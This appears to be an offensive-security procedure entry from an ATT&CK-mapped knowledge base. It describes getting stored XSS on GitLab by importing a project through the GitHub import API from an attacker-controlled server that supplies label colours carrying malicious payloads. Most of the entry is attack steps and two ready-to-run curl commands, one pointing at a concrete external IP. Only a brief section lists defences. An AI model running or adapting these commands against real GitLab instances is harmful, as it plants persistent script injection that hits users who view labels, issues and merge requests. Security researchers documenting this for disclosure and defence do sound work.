---
id: proc-uuid-2
tags:
  - xss
  - import
  - api
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-gitlab-import-generic]]'
  - '[[commands/curl-gitlab-import-example]]'
verified: false
platforms:
  - Web
  - Cloud (GitLab.com)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:56:19.878Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Import-Malicious-Project-into-GitLab-via-API

## Summary

This procedure uses GitLab's GitHub import API to pull a project from the dummy server, importing labels with unsanitized color payloads that enable stored XSS when viewed.

## Description

GitLab's import endpoint fetches label data from the specified GitHub hostname without validating color fields, allowing JavaScript injection. This step requires a GitLab personal access token and points to the dummy server. The imported project will contain the malicious labels, exploitable on labels, issues, and merge requests pages. Expected outcome: Project imported successfully, ready for XSS triggering.

## Requirements

1. Valid GitLab personal access token with import permissions
2. GitHub personal access token for the dummy (fake) repo
3. Dummy server running and accessible
4. curl installed for API calls

## Defense

Defensive measures and detection strategies:

- Validate and sanitize imported label colors server-side
- Log and alert on imports from non-standard GitHub hostnames
- Implement CSP to block inline JavaScript execution

## Objectives

1. Inject malicious labels into GitLab project
2. Bypass validation during import process
3. Set up persistent stored XSS payload

## Instructions

### Step 1: Execute Generic Import

**Context**: POST to GitLab API with dummy server details to start import.

**Command** ([[commands/curl-gitlab-import-generic]]):
```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "523303538", "target_namespace": "YOUR_GITLAB_USERNAME", "new_name": "xss-on-label-color", "github_hostname": "http://YOUR_IP:YOUR_PORT"}'
```

> Sends JSON payload with import config. Expected output: API response with import ID and status "started".

### Step 2: Run Specific Example Import

**Context**: Use concrete values for reproduction.

**Command** ([[commands/curl-gitlab-import-example]]):
```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "523303538", "target_namespace": "yvvdwf", "new_name": "xss-on-label-color", "github_hostname": "http://51.75.74.52:80"}'
```

> Example with real-like tokens/IP. Expected output: Successful import confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-gitlab-import-generic]]
- [[commands/curl-gitlab-import-example]]

## Tools Used

- [[tools/curl]]

## Tags

- xss
- import
- api
